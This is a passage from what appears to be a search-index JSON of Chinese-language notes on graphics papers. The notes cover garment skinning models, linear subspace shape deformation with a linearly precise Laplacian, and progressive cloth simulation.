Model","text":"<p>\u6211\u4eec\u7684\u4e0b\u4e00\u4e2a\u76ee\u6807\u662f\u5b9a\u4e49\u4e00\u4e2a\u80fd\u591f\u8868\u793a\u73b0\u5b9e\u8863\u670d\u81ea\u7136\u5f62\u53d8\u7684 Garment Model\u3002</p> <p>\u6211\u4eec\u5229\u7528 Section 4.1 \u4e2d\u8ba1\u7b97\u7684 Diffused Skinning Functions \u6765\u5236\u5b9a Unposed &amp; deshaped Garment Model\uff1a</p> \\[\\begin{align} M_G(X, \\beta, \\theta) = W(T_G (X, \\beta, \\theta), J(\\beta), \\theta, \\widetilde{\\mathcal W} (X)) \\tag 7 \\\\ T_G(X,\\beta, \\theta) = X+ \\widetilde{B_s} (X,\\beta) + \\widetilde{B_p} (X,\\theta) \\tag 8 \\end{align} \\] <ul> <li>\\(T_G\\) \u4e3a\u5e94\u7528\u4e86 Diffused Blendshapes Correctives \u7684 deformed garment</li> <li>\\(X\\) \u4e3a Garment Deformation in Canonical Space</li> </ul>"},{"location":"Accumulation/paper/speedup_1/","title":"Linear subspace design for real-time shape deformation","text":""},{"location":"Accumulation/paper/speedup_1/#linear-subspace-design-for-real-time-shape-deformation","title":"Linear Subspace Design for Real-Time Shape Deformation","text":"<p> \u7ea6 1793 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>https://dl.acm.org/doi/10.1145/2766952</p>"},{"location":"Accumulation/paper/speedup_1/#linear-subspace","title":"Linear Subspace","text":"<p>\u6211\u4eec\u57fa\u4e8e non-convex input subregion \\(\\Omega \\in R^d\\ (d=2,3)\\)\uff0c\u9759\u6b62\u72b6\u6001\u7684 vertices \u7528 \\(\\bar{V} \\in R^{n\\times d}\\) \u8868\u793a\uff0c\u53d8\u5f62\u540e\u7684 vertices \u7528 \\(V\\in R^{n\\times d}\\) \u8868\u793a\uff0c\u5176\u4e2d \\(n\\) \u662f\u9876\u70b9\u7684\u4e2a\u6570\u3002</p> <p>\u672c\u65b9\u6cd5\u901a\u8fc7\u5728\u5b50\u7a7a\u95f4\u4e2d\u7ed3\u5408 region handles \u548c point handles \u8fdb\u884c\u63a7\u5236\u6765\u540c\u65f6\u83b7\u5f97\u4ee5\u4e0b\u4e24\u70b9\u4f18\u70b9\uff1a</p> <ul> <li>\u53ea\u6709 region handles \u65f6\uff0c\u5b50\u7a7a\u95f4\u7c7b\u4f3c\u4e8e\u4f20\u7edf\u7684 skinning</li> <li>\u53ea\u6709 point handles \u65f6\uff0c\u5b50\u7a7a\u95f4\u5bf9\u5e94\u4e8e\u5e7f\u4e49\u91cd\u5fc3\u5750\u6807</li> </ul> <p>\u5047\u5b9a user \u624b\u52a8\u9009\u53d6\u4e86 \\(m_p\\) \u4e2a control points \u548c \\(r\\) \u4e2a regions\uff08\u5bf9\u5e94\u6709 \\(m_r\\) \u4e2a vertices\uff09\uff0c\u6211\u4eec\u5c06\u4e0e\u63a7\u5236\u67c4\u76f8\u5173\u7684\u6240\u6709\u9759\u6b62\u72b6\u6001\u7684\u9876\u70b9\u4f4d\u7f6e\u805a\u96c6\u8d77\u6765\uff0c\u7528 \\(\\bar{C} \\in R^{m\\times d}\\)\uff0c\u5176\u4e2d \\(m= m_p + m_r\\)\u3002</p> <ul> <li>\u5bf9\u4e8e \\(m_p\\) \u4e2a\u72ec\u7acb\u63a7\u5236\u70b9\uff0c\u6bcf\u4e2a\u70b9\u662f\u4e00\u4e2a\u81ea\u7531\u70b9\uff0c\u5728\u4e00\u4e2a \\(d\\) \u7ef4\u7a7a\u95f4\u79fb\u52a8\uff0c\u8d21\u732e\u4e86 \\(d\\) \u4e2a\u81ea\u7531\u5ea6\uff08DoFs\uff09\u3002</li> <li>\u5bf9\u4e8e \\(r\\) \u4e2a\u63a7\u5236\u533a\u57df\uff0c\u6bcf\u4e2a\u533a\u57df\u901a\u8fc7\u4eff\u5c04\u53d8\u6362\u8fdb\u884c\u63a7\u5236\uff0c\u5305\u62ec \\(d^2\\) \u81ea\u7531\u5ea6\u7684\u65cb\u8f6c\u3001\u7f29\u653e\u3001\u526a\u5207\u7b49\u7ebf\u6027\u53d8\u6362\u4ee5\u53ca \\(d\\) \u4e2a\u81ea\u7531\u5ea6\u7684\u5e73\u79fb\u53d8\u6362\uff0c\u56e0\u6b64\u6bcf\u4e2a\u533a\u57df\u8d21\u732e \\(d^2+d\\) \u81ea\u7531\u5ea6</li> </ul> <p>\u5c06\u4e0a\u8ff0\u4e24\u90e8\u5206\u76f8\u52a0\uff0c\u6211\u4eec\u5f97\u5230\u8fd9\u4e2a\u5b50\u7a7a\u95f4\u7684\u603b\u7ef4\u5ea6\uff1a</p> \\[ m_p\\times d + r(d+1)d \\] <p>\u6211\u4eec\u5c06\u63a7\u5236\u70b9\u7684\u76ee\u6807\u4f4d\u7f6e\u6309\u884c\u5b58\u50a8\u4e8e \\(C_1 \\in R^{m_p\\times d}\\)\uff0c\u5c06\u63a7\u5236\u533a\u57df\u4e2d\u70b9\u7684\u76ee\u6807\u4f4d\u7f6e\u5b58\u50a8\u4e3a \\(C_2 = J_2 H_2 \\in R^{m_r\\times d}\\)\uff0c\u5176\u4e2d \\(J_2\\in R^{m_r \\times r(d+1)}\\) \u662f\u4e00\u4e2a Rigid Skinning Matrix\u3002\u6211\u4eec\u5c06\u76ee\u6807\u4f4d\u7f6e \\(C\\) \u7ec4\u5408\u6210\u5982\u4e0b\u77e9\u9635\u79ef\uff1a</p> <p>$$ C = \\left [\\begin{matrix} C_1 \\ C_2\\end{matrix}\\right ] = \\left [\\begin{matrix} I_{m_p} &amp; 0 \\ 0 &amp; j_2 \\end{matrix}\\right ]\\left [\\begin{matrix} C_1 \\ H_2 \\end{matrix}\\right ] \\tag{1} $$ \u7ed3\u679c\u77e9\u9635 \\(C\\) \u5305\u542b\u4e86\u63a7\u5236\u67c4\u7684\u6240\u6709 target positions\uff0c\u800c\u77e9\u9635 \\(H\\in R^{h\\times d }\\ (h=m_p + r(d+1))\\) \u6c47\u96c6\u4e86\u5b50\u7a7a\u95f4\u7684\u6240\u6709\u53c2\u6570\uff0c\u5b83\u7684\u7ef4\u5ea6\u5373\u4e3a\u6211\u4eec\u4e4b\u524d\u6240\u63a8\u5bfc\u7684\u81ea\u7531\u5ea6\u3002</p>"},{"location":"Accumulation/paper/speedup_1/#variational-form","title":"Variational form","text":"<p>\u73b0\u5728\u5047\u5b9a\u6211\u4eec\u6709\u4e00\u822c\u7684\u7b49\u5f0f\u7ea6\u675f\u4e8c\u6b21\u4f18\u5316\u95ee\u9898\uff0c\u6709\u5982\u4e0b\u7c7b\u4f3c\u5f62\u5f0f\uff1a</p> \\[ V=arg\\min_{X\\in R^{n\\times d}} \\frac{1}{2}trace(X^T AX)\\ \\ subject\\ to\\ \\ SX=JH \\tag{2} \\] \u7b26\u53f7 \u542b\u4e49 \\(X \\in \\mathbb{R}^{n \\times d}\\) \u7f51\u683c\u9876\u70b9\u7684\u4f4d\u7f6e\u77e9\u9635\uff08\u4f18\u5316\u53d8\u91cf\uff09 \\(A \\in \\mathbb{R}^{n \\times n}\\) \u4e8c\u6b21\u80fd\u91cf\u77e9\u9635\uff0c\u8861\u91cf\u53d8\u5f62\u201c\u81ea\u7136\u6027\u201d\uff08\u5982 Laplacian\u3001biharmonic\u3001ARAP \u7b49\uff09 \\(S \\in \\mathbb{R}^{m \\times n}\\) \u884c\u9009\u62e9\u77e9\u9635\uff0c\u9009\u51fa\u63a7\u5236\u67c4\u5bf9\u5e94\u7684\u9876\u70b9\uff08\u5305\u62ec control points \u548c regions \u4e2d\u7684\u70b9\uff09 \\(JH \\in \\mathbb{R}^{m \\times d}\\) \u63a7\u5236\u67c4\u76ee\u6807\u4f4d\u7f6e\u3002\u6765\u81ea\u516c\u5f0f (1)\uff1a\u5c06\u63a7\u5236\u53c2\u6570 \\(H\\) \u6620\u5c04\u4e3a\u63a7\u5236\u9876\u70b9\u7684\u76ee\u6807\u4f4d\u7f6e \\(V \\in \\mathbb{R}^{n \\times d}\\) \u6700\u7ec8\u7684\u89e3\uff0c\u5373\u6ee1\u8db3\u53d8\u5f62\u80fd\u91cf\u6700\u5c0f\u548c\u63a7\u5236\u7ea6\u675f\u7684\u9876\u70b9\u4f4d\u7f6e <p>\u5b9a\u4e49\u77e9\u9635 \\(T\\in R^{(n-m)\\times n}\\) \u4e3a\u9009\u62e9\u9664\u4e86\u63a7\u5236\u67c4\u4ee5\u5916\u7684\u6240\u6709\u9876\u70b9\uff0c\u90a3\u4e48\u6b64\u65f6\u6709\uff1a</p> <ul> <li>\\(S X \\in \\mathbb{R}^{m \\times d}\\)\uff1a\u53d7\u63a7\u5236\u7684\u70b9\uff0c\u7531\u63a7\u5236\u53c2\u6570\u51b3\u5b9a\uff1b</li> <li>\\(T X \\in \\mathbb{R}^{(n-m) \\times d}\\)\uff1a\u81ea\u7531\u53d8\u91cf(\u8981\u4f18\u5316\u7684\u90e8\u5206)\uff0c\u672a\u77e5\u53d8\u91cf\u3002</li> </ul> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c06 \\(X=SX+TX\\) \u4ee3\u5165\u5e76\u5bf9\u4f18\u5316\u53d8\u91cf \\(TX\\) \u6c42\u5bfc\uff0c\u5f97\u5230\u5982\u4e0b\u7b54\u6848\uff1a</p> \\[\\begin{array}l W= S^TJ - T^T (TAT^T) ^{-1} TAS^TJ \\\\ V= WH \\end{array} \\tag{3} \\] <p>\\(V\\) \u5373\u4f18\u5316\u65b9\u7a0b\u5f97\u5230\u7684\u53d8\u5f62\u540e\u4f4d\u7f6e</p>"},{"location":"Accumulation/paper/speedup_1/#affine-invariance","title":"Affine invariance","text":"<p>\u6211\u4eec\u5e0c\u671b\u8bc1\u660e\u8fd9\u4e2a\u4f18\u5316\u65b9\u6cd5\u5177\u6709\u4eff\u5c04\u4e0d\u53d8\u6027\u3002</p> <ul> <li>\u65cb\u8f6c\u4e0d\u53d8\u6027: \u5982\u679c\u6211\u4eec\u5bf9\u53c2\u6570 \\(H\\) \u53f3\u4e58\u4e00\u4e2a\u65cb\u8f6c\u77e9\u9635 \\(R\\)\uff0c\u5373\u5bf9\u63a7\u5236\u67c4\u6574\u4f53\u505a\u4e00\u4e2a\u521a\u4f53\u65cb\u8f6c\uff0c\u90a3\u4e48\u6700\u7ec8\u7684\u53d8\u5f62\u7f51\u683c\u4e5f\u4f1a\u88ab\u65bd\u52a0\u540c\u4e00\u4e2a\u76f8\u540c\u7684\u65cb\u8f6c\uff1a\\(V=W(HR)=(WH)R\\)</li> <li>\u5e73\u79fb\u4e0d\u53d8\u6027: \u8981\u6c42\u80fd\u91cf\u9879\u7684\u9009\u53d6 \\(A\\) \u7684\u6bcf\u4e00\u884c\u7684\u5143\u7d20\u52a0\u8d77\u6765\u4e3a 0\uff0c\u5373 \\(A\\) \u7684\u96f6\u7a7a\u95f4\u5305\u542b\u5168 1 \u5411\u91cf\uff08\\(A1_n=0\\)\uff09\u3002<ul> <li>\u4f20\u7edf\u7684\u4e8c\u6b21\u80fd\u91cf\u9879\u4e0d\u4e00\u5b9a\u80fd\u591f\u4fdd\u8bc1\u4e0a\u8ff0\u96f6\u7a7a\u95f4\u5047\u8bbe\uff0c\u4e0d\u6ee1\u8db3 Linear Precision</li> </ul> </li> </ul>"},{"location":"Accumulation/paper/speedup_1/#linearly-precise-smoothness-energy","title":"Linearly precise smoothness energy","text":"<p>\u4eff\u5c04\u4e0d\u53d8\u6027\u4e00\u8282\u4e2d\u63d0\u5230\u5bf9\u4e8e\u4f18\u5316\u7684\u80fd\u91cf\u9879\u9700\u8981\u6ee1\u8db3 Linear Precision\uff0c\u672c\u8bba\u6587\u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e86\u4e00\u4e2a Linearly Precise \u5e73\u6ed1\u80fd\u91cf\u9879\u3002</p> <p>\u5e76\u4e14\u4fdd\u6301\u77e9\u9635\u7684\u7a00\u758f\u6027\uff0c\u4ee5\u4fdd\u8bc1\u6c42\u89e3\u7ebf\u6027\u7cfb\u7edf\u7684\u901f\u5ea6</p> <p>\u5bf9\u4e8e\u7ecf\u5178\u7684\u62c9\u666e\u62c9\u65af\u9879\uff0c\u5b83\u60e9\u7f5a\u6bcf\u4e2a\u70b9\u548c\u90bb\u5c45\u4e4b\u95f4\u7684\u4e0d\u4e00\u81f4\uff0c\u4ece\u800c\u9f13\u52b1\u8868\u9762\u5e73\u6ed1\u53d8\u5316\u3002\u5b83\u7684\u80fd\u91cf\u5f62\u5f0f\u4e00\u822c\u4e3a\uff1a</p> \\[ x^T L^T M^{-1}Lx \\tag{4} \\] <ul> <li>\\(L\\)\uff1a\u79bb\u6563\u62c9\u666e\u62c9\u65af\u77e9\u9635\uff08\u5e38\u7528 cotangent \u62c9\u666e\u62c9\u65af\uff09</li> <li>\\(M\\)\uff1a\u8d28\u91cf\u77e9\u9635\uff08\u5bf9\u89d2\u7ebf\u77e9\u9635\uff0c\u5b58\u50a8\u6bcf\u4e2a\u9876\u70b9\u7684\u4f53\u79ef\u6216\u9762\u79ef\uff09</li> <li>\\(x\\)\uff1a\u5f53\u524d\u6240\u6709\u9876\u70b9\u7684\u4e00\u7ef4\u5750\u6807\uff08\u6bd4\u5982 \\(x \\in \\mathbb{R}^n\\)\uff09</li> </ul> <p>\u7406\u60f3\u7684\u5e73\u6ed1\u80fd\u91cf\u4e0d\u5e94\u8be5\u60e9\u7f5a\u4e00\u4e2a\u5168\u5c40\u5e73\u79fb\u6216\u8005\u7ebf\u6027\u53d8\u6362\uff08\u7f29\u653e\u3001\u65cb\u8f6c\u7b49\uff09\uff0c\u5b83\u4eec\u90fd\u5e94\u8be5\u6ee1\u8db3\u5e38\u6570\u7cbe\u786e\u6027\uff0c\u5373 \\(L1_n=0\\)\u3002\u4f46\u662f\uff0c\u5927\u591a\u6570\u6807\u51c6 cotangent laplacian \u5728\u8fb9\u754c\u70b9\u5904\u5e76\u4e0d\u6ee1\u8db3\u7ebf\u6027\u7cbe\u786e\u6027\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u5168\u5c40\u5e73\u79fb\u6216\u7ebf\u6027\u53d8\u6362\u5728\u8fb9\u754c\u70b9\u9644\u8fd1\u4f1a\u88ab\u5224\u5b9a\u4e3a\u4e0d\u5e73\u6ed1\u3002</p> <p>\u4ee5\u524d\u7684\u4e00\u4e9b\u80fd\u91cf\u9879\u8bbe\u7f6e\u5bfc\u81f4\u7684\u7ed3\u679c</p> <p></p> <p>\u5b9e\u9645\u4e0a\uff0c\u8fd9\u662f\u7531\u4e8e\u6807\u51c6 cotangent laplacian \u7684\u8fb9\u754c\u8fb9\u7279\u6b8a\u5b9a\u4e49\u5bfc\u81f4\u7684\uff1a</p> <ul> <li>\u5bf9\u4e8e\u5185\u90e8\u8fb9\uff1a</li> </ul> \\[ L_{ij}= \\frac{1}{2} (\\cot \\alpha _{ij} + \\cot \\beta _{ij})  \\] <ul> <li>\u5bf9\u4e8e\u8fb9\u754c\u8fb9\uff1a</li> </ul> \\[ L_{ij} = \\frac{1}{2} \\cot \\alpha _{ij} \\] <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5bf9\u4e8e\u8fb9\u754c\u9879\u5c11\u4e86\u4e00\u4e2a cotangent\uff0c\u56e0\u4e3a\u5b83\u53ea\u88ab\u4e00\u4e2a\u4e09\u89d2\u5f62\u5305\u542b\u3002\u8fd9\u4f1a\u5bfc\u81f4\u80fd\u91cf\u4e0d\u5bf9\u79f0\uff0c\u4e0d\u80fd\u5b8c\u5168\u6355\u6349\u5230\u7ebf\u6027\u51fd\u6570\u7684\u884c\u4e3a\u3002</p> <p>\u4e3a\u4e86\u4fee\u590d\u8fd9\u4e00\u884c\u4e3a\uff0c\u6211\u4eec\u5e0c\u671b\u5bf9\u8fb9\u754c\u9879\u589e\u52a0\u6cd5\u5411\u5bfc\u6570\u8865\u507f\u3002\u8bba\u6587\u4e2d\u5f15\u5165\u4e86\u65b0\u7684\u77e9\u9635\uff1a</p> \\[ K= L +N \\] <p>\u6211\u4eec\u5c06 Normal Derivative \\(N\\) \u6dfb\u52a0\u5230\u6240\u6709\u8fb9\u754c\u70b9\u5bf9\u5e94\u7684 row \u4e0a\uff0c\u4ece\u800c\u5f97\u5230\u4e00\u4e2a Linear Precise Cotangent Laplacian \\(K\\)\u3002</p> <p>\\(N_ix\\) \u8868\u793a\u9876\u70b9 \\(i\\) \u7684\u6cd5\u5411\u5bfc\u6570\u4f30\u8ba1\u503c\uff0c\u662f\u56db\u4e2a cotangent \u4e58\u4ee5\u76f8\u90bb\u9876\u70b9\u5dee\u503c\u6743\u91cd\uff1a</p> \\[ N_ix = \\frac{\\cot \\gamma_{ik}}{2} (x_i - x_k) + \\frac{\\cot \\gamma_{jk}}{2} (x_j - x_k) + \\frac{\\cot \\gamma_{iq}}{2} (x_i - x_q) + \\frac{\\cot \\gamma_{pq}}{2} (x_p - x_q) \\] <p>\u5176\u4e2d \\(j,k\\) \u662f\u4e0e \\(i\\) \u76f8\u90bb\u7684\u8fb9\u754c\u70b9\uff0c\u800c \\(p,q\\) \u4e3a\u76f8\u5e94\u7684 triangles \u7684\u7b2c\u4e09\u4e2a\u70b9\u3002</p> <p>\u56e0\u4e3a\u662f\u8fb9\u754c\u70b9\uff0c\u6240\u4ee5\u53ea\u6709\u4e24\u4e2a\u76f8\u90bb\u70b9\uff1b\\(\\gamma_{ab}\\) \u8868\u793a\u8fb9 \\(ab\\) \u5bf9\u9762\u7684\u89d2</p> \u5bf9\u4e8e\u56db\u9762\u4f53\u5f62 mesh\uff0c\u4f1a\u66f4\u52a0\u590d\u6742\u4e00\u4e9b\uff0c\u6b64\u5904\u4e0d\u518d\u6253\u5b57\u4e86 <p></p> <p>\u5c06 \\(K\\) \u66ff\u6362\u539f\u62c9\u666e\u62c9\u65af\u5e73\u6ed1\u80fd\u91cf\u9879\u4e2d\u7684 \\(L\\) \u540e\uff0c\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684 Linearly Precise Laplacian Smoothness Energy\uff1a</p> \\[\\begin{array}l A &amp; = K^T M^{-1} K \\\\ E &amp; = x^T Ax \\end{array} \\] <p>\u8fd9\u4e2a\u80fd\u91cf\u5177\u5907\u4e24\u4e2a\u597d\u5904\uff1a</p> <ol> <li>\u5e38\u6570\u7cbe\u786e\u6027\uff1a\u5373 \\(A \\cdot \\mathbf{1} = 0\\)</li> <li>\u7ebf\u6027\u7cbe\u786e\u6027\uff1a\u5373 \\(A \\cdot x = 0\\) \u5bf9\u6240\u6709\u7ebf\u6027\u51fd\u6570 \\(x\\) \u6210\u7acb</li> </ol> \u4e0a\u8ff0\u5b9a\u4e49\u7684 \\(K\\) \u53ef\u80fd\u5bfc\u81f4\u8d1f\u6743\u91cd\uff0c\u4f46\u8fd9\u5e76\u975e\u52a3\u52bf\uff0c\u5f3a\u5236\u975e\u8d1f\u4f1a\u5bfc\u81f4\u63d2\u503c\u4e0d\u5e73\u6ed1\u3001\u6c42\u89e3\u66f4\u6162\u7b49 <p></p>"},{"location":"Accumulation/paper/speedup_1/#domain-reduction-for-non-linear-optimization","title":"Domain reduction for non-linear optimization","text":"<p>\u5f88\u591a\u51e0\u4f55\u5efa\u6a21\u6216\u7269\u7406\u4eff\u771f\u7684\u65b9\u6cd5\u90fd\u6d89\u53ca\u975e\u7ebf\u6027\u4f18\u5316\uff0c\u4f8b\u5982 As-Rigid-As-Possible \u5f62\u53d8(ARAP)\u3001\u5f39\u6027\u6a21\u62df\u7b49\u3002\u8fd9\u7c7b\u4f18\u5316\u5728\u9ad8\u5206\u8fa8\u7387\u7f51\u683c\u4e0b\u5341\u5206\u8017\u65f6\uff0cDomain Reduction \u5c06\u95ee\u9898\u9650\u5236\u5728\u4e00\u4e2a\u4f4e\u7ef4\u7ebf\u6027\u5b50\u7a7a\u95f4\u4e2d\uff0c\u4ece\u800c\u663e\u8457\u52a0\u5feb\u8ba1\u7b97\u901f\u5ea6\u3002</p> <p>\u5173\u4e8e\u8fd9\u4e9b\u5e94\u7528\uff0c\u53ef\u4ee5\u770b\u539f\u8bba\u6587\u4e2d\u7684 Section 4. Results \u90e8\u5206\u3002</p>"},{"location":"Accumulation/paper/speedup_2/","title":"Progressive Shell Quasistatics for Unstructured Meshes","text":""},{"location":"Accumulation/paper/speedup_2/#progressive-shell-quasistatics-for-unstructured-meshes","title":"Progressive Shell Quasistatics for Unstructured Meshes","text":"<p> \u7ea6 3329 \u4e2a\u5b57  70 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 18 \u5206\u949f</p> <p>https://pcs-sim.github.io/psq/</p>"},{"location":"Accumulation/paper/speedup_2/#progressive-simulation","title":"Progressive Simulation","text":""},{"location":"Accumulation/paper/speedup_2/#introduction","title":"Introduction","text":"<p>Progressive Cloth Simulation (PCS)</p> <p>\u4f20\u7edf\u5e03\u6599\u4eff\u771f\u5b58\u5728\u901f\u5ea6\u548c\u7cbe\u5ea6\u7684\u77db\u76fe\uff1a\u7c97\u7cd9\u7f51\u683c\u867d\u7136\u8ba1\u7b97\u901f\u5ea6\u5feb\uff0c\u4f46\u65e0\u6cd5\u53cd\u6620\u7ec6\u7f51\u683c\u4eff\u771f\u540e\u7684\u8936\u76b1\u548c\u5377\u66f2\u7b49\u7ec6\u8282\uff1b\u800c\u9ad8\u7cbe\u5ea6\u7f51\u683c\u4eff\u771f\u8ba1\u7b97\u91cf\u5de8\u5927\u3002</p> <p>PCS\u9996\u5148\u5bf9\u6781\u4f4e\u5206\u8fa8\u7387\u7684\u7f51\u683c\u8fdb\u884c\u78b0\u649e\u542b\u6469\u64e6\u7684\u51c6\u9759\u6001\u4eff\u771f\uff08\u901a\u5e38\u57fa\u4e8e\u8fde\u7eed\u78b0\u649e\u52bf\u80fd\u6a21\u578bC-IPC\u6c42\u89e3\uff09\uff0c\u5f97\u5230\u4e00\u4e2a\u7c97\u7565\u7684\u5e73\u8861\u5f62\u6001\uff1b\u7136\u540e\u5c06\u8be5\u5f62\u6001\u63d2\u503c\u5230\u66f4\u9ad8\u5206\u8fa8\u7387\u7684\u7f51\u683c\u4f5c\u4e3a\u521d\u59cb\u72b6\u6001\uff0c\u518d\u8fdb\u884c\u4e0b\u4e00\u5c42\u7ec6\u5316\u4eff\u771f\u3002\u5982\u6b64\u8fed\u4ee3\u76f4\u5230\u8fbe\u5230\u6240\u9700\u7cbe\u5ea6\u65f6\u624d\u505c\u6b62\uff0c\u4ece\u800c\u4fdd\u8bc1\u6bcf\u4e00\u5c42\u7684\u4eff\u771f\u7ed3\u679c\u90fd\u81ea\u6d3d\u4e00\u81f4\u4e14\u65e0\u4efb\u4f55\u4ea4\u53e0\uff0c\u6700\u7ec8\u7ec6\u7f51\u683c\u7ed3\u679c\u4e0e\u771f\u5b9e\u7684\u5b8c\u5168\u6536\u655b\u89e3\u9ad8\u5ea6\u4e00\u81f4</p> <p>\u6e10\u8fdb\u5f0f\u6a21\u62df\u901a\u8fc7\u4e00\u7cfb\u5217\u5206\u8fa8\u7387\u4e0d\u65ad\u63d0\u5347\u7684\u7f51\u683c\u5c42\u6b21\u751f\u6210\u5177\u6709\u4e00\u81f4\u6027\u4e14\u9010\u6e10\u6539\u8fdb\u7684\u89e3\u51b3\u65b9\u6848\u9884\u89c8\uff0c\u5e76\u5728\u6700\u7ec8\u7684\u9ad8\u5206\u8fa8\u7387\u7f51\u683c\u4e0a\u751f\u6210\u6536\u655b\u7684\u6a21\u62df\u8f93\u51fa\u3002</p> <p>\u6bcf\u5c42\u7ed3\u6784\u7531\u4e00\u7ec4\u4e09\u89d2\u5f62\u7f51\u683c\u548c\u5bf9\u5e94\u7684\u5ef6\u62d3\u7b97\u5b50\uff08prolongation operators\uff09\u7ec4\u6210\uff0c\u5ef6\u62d3\u7b97\u5b50\u5c06\u8be5\u5c42\u7684\u7f51\u683c\u6620\u5c04\u5230\u4e0b\u4e00\u5c42\u66f4\u9ad8\u5206\u8fa8\u7387\u7684\u7f51\u683c\u4e0a\u3002</p> <p>\u5c06\u7c97\u7c92\u5ea6\u7f16\u8f91\u4f20\u64ad\u5230\u7ec6\u7c92\u5ea6\uff08\u6216\u7b49\u4ef7\u5730\uff0c\u5c06\u7ec6\u7c92\u5ea6\u7ec6\u8282\u91cd\u65b0\u5f15\u5165\u53d8\u5f62\u7c97\u8868\u9762\uff09\u9700\u8981\u5728\u7c97\u8868\u9762\u548c\u7ec6\u8868\u9762\u4e4b\u95f4\u5efa\u7acb\u6620\u5c04</p> <p>\u6bcf\u5c42\u7f51\u683c\u901a\u8fc7\u4e0b\u6807 \\(l\\in [0,L]\\) \u7d22\u5f15\uff0c\\(x_l, \\bar{x}_l\\) \u5206\u522b\u8868\u793a\u7b2c \\(l\\) \u5c42\u7f51\u683c \\(n_l\\) \u7684 deformed position \u548c rest position\uff0c\\(P_{l+1}^l \\in R^{3n_{l+1}\\times 3n_l}\\) \u8868\u793a\u5c06\u5c42\u7ea7 \\(l\\) \u6620\u5c04\u5230 \\(l+1\\) \u7684\u5ef6\u62d3\u7b97\u5b50\u3002</p> <p>\u90a3\u4e48\u6700\u7c97\u7cd9\uff08coarest\uff09\u7684\u7f51\u683c\u7684\u53d8\u5f62\u4f4d\u7f6e\u5c31\u5b58\u50a8\u4e8e \\(x_0\\)</p> <p>\u4e3a\u4e86\u7b80\u5316\u8ba8\u8bba\uff0c\u6211\u4eec\u5728\u8bba\u6587\u4e2d\u6240\u7528\u7684\u4e0d\u5e26\u4e0b\u6807\u7684\u53d8\u91cf\u901a\u5e38\u6307\u6700\u9ad8\u5c42\uff08finest-level\uff09\u5206\u8fa8\u7387\u7684\u5c5e\u6027\uff0c\u4f8b\u5982 \\(x=x_L, \\bar{x} =\\bar{x}_L, n=n_L\\)\u3002</p> <p>\u5bf9\u4e8e\u6bcf\u4e00\u4e2a simulation mesh\uff0c\u8bba\u6587\u5b9a\u4e49\u4e86\u591a\u79cd\u52bf\u80fd\u9879\uff0c\u5e76\u5c06\u5b83\u4eec\u52a0\u603b\u6784\u6210\u603b\u52bf\u80fd\uff1a</p> \\[E_l(x) \\;=\\; \\Psi_l(x) \\;+\\; B_l(x) \\;+\\; D_l(x) \\;+\\; S_l(x).\\] <ul> <li>\\(\\Psi_l\\)\u200b\uff1a\u8584\u58f3\u5f39\u6027\u52bf\u80fd\uff08Shell energy\uff09\uff0c\u523b\u753b\u7f51\u683c\u672c\u8eab\u7684\u62c9\u4f38\u3001\u5f2f\u66f2\u7b49\u5f39\u6027\u53d8\u5f62\u3002</li> <li>\\(B_l\\)\u200b\uff1a\u63a5\u89e6\u5c4f\u969c\u52bf\u80fd\uff08Barrier potential\uff09\uff0c\u7528\u4e8e\u4fdd\u8bc1\u4e0d\u540c\u90e8\u4f4d\u6216\u4e0d\u540c\u7269\u4f53\u4e4b\u95f4\u4e0d\u53d1\u751f\u7a7f\u900f\u3002</li> <li>\\(D_l\\)\u200b\uff1a\u6469\u64e6\u8017\u6563\u52bf\u80fd\uff08Dissipation potential\uff09\uff0c\u7528\u4e8e\u5728\u63a5\u89e6\u9762\u4e0a\u5f15\u5165\u6469\u64e6\u529b\u3002</li> <li>\\(S_l\\)\u200b\uff1a\u5e94\u53d8\u9650\u5236\u52bf\u80fd\uff08Strain-limiting potential\uff09\uff0c\u53ef\u9009\u9879\uff0c\u7528\u4ee5\u9632\u6b62\u7f51\u683c\u5355\u5143\u4ea7\u751f\u8fc7\u5927\u5e94\u53d8\u3002</li> </ul> <p>\u6750\u6599\u53c2\u6570\u3001\u8fb9\u754c\u6761\u4ef6\u7b49\u7edf\u4e00\u6536\u5f55\u5728\u53c2\u6570\u5411\u91cf \\(u\\) \u4e2d\uff0c\u8fd9\u4e9b\u53c2\u6570\u5728\u4eff\u771f\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u53d1\u751f\u6539\u53d8\uff08\u4f8b\u5982\u65bd\u52a0\u8f7d\u8377\u3001\u8f6c\u52a8\u8fb9\u754c\u7b49\uff09\u3002</p> <p>\u5728\u4e00\u4e2a time-stepping \u4e2d\uff0c\u6709\u5f53\u524d\u72b6\u6001 \\(x^t\\) \u548c\u5f53\u524d\u53c2\u6570 \\(u\\)\uff0cprogressive simulation \u4f7f\u7528\u9690\u5f0f\u6b27\u62c9\u6cd5\u8ba1\u7b97\u68af\u5ea6\u6d41\uff08gradient flow\uff09\uff0c\u5c06\u68af\u5ea6\u6d41\u6f14\u5316\u4e3a\u4e00\u7cfb\u5217\u589e\u91cf\u7684\u80fd\u91cf\u6700\u5c0f\u5316\uff1a</p> <p>\u76f4\u63a5\u6a21\u62df\u8fde\u7eed\u6d41\u8f83\u4e3a\u590d\u6742\uff0c\u8bba\u6587\u7528\u9690\u5f0f\u6b27\u62c9\uff08Backward Euler\uff09\u505a\u65f6\u95f4\u79bb\u6563\uff0c\u5c06\u68af\u5ea6\u6d41\u6f14\u5316\u4e3a\u4e00\u7cfb\u5217\u589e\u91cf\u7684\u80fd\u91cf\u6700\u5c0f\u5316\uff1a</p> \\[x^{t+1} =\\arg\\min_{x}\\; \\underbrace{\\frac{1}{2h^2}\\,\\|x - x^t\\|_M^2}_{\\text{\u60ef\u6027\u9879}} \\;+\\; E(x,\\,\\bar x,\\,u^{t+1}) \\tag{1}\\] <ul> <li>\\(h\\): \u65f6\u95f4\u6b65\u957f</li> <li>\\(\\frac{1}{2h^2}\\,\\|x - x^t\\|_M^2\\): \u60ef\u6027\u9879\uff0c\u9632\u6b62\u65b0\u72b6\u6001\u504f\u79bb\u592a\u8fdc</li> 